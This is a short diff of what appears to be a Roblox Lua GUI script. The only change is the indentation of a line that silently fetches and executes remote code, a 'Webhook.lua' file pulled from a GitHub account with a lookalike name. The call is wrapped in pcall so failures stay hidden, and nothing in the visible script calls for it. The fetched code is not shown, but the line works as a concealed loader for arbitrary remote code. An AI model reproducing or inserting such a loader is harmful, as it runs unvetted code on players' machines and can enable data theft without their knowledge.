@@ -5,7 +5,7 @@ local plr = Players.LocalPlayer
 local playerGui = plr:WaitForChild("PlayerGui")
 
 pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/StarFIow/Scripts/main/Utility/Webhook.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/StarFIow/Scripts/main/Utility/Webhook.lua"))()
 end)
 
 local gui = Instance.new("ScreenGui")
